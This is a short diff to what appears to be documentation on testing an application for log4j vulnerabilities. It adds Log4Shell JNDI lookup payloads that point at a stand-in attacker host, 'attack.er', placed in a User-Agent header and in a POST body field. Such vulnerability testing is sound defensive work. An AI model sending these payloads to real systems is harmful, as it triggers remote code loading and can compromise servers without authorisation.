@@ -62,5 +62,9 @@ In order to test for log4j vulnerabilities in this application, the payload must
 
 ```bash
 /GET
-User-Agent:{}
+User-Agent: ${jndi:ldap://attack.er/path}
+
+/POST
+(body part)
+payload=${jndi:ldap://attack.er/path}
 ```
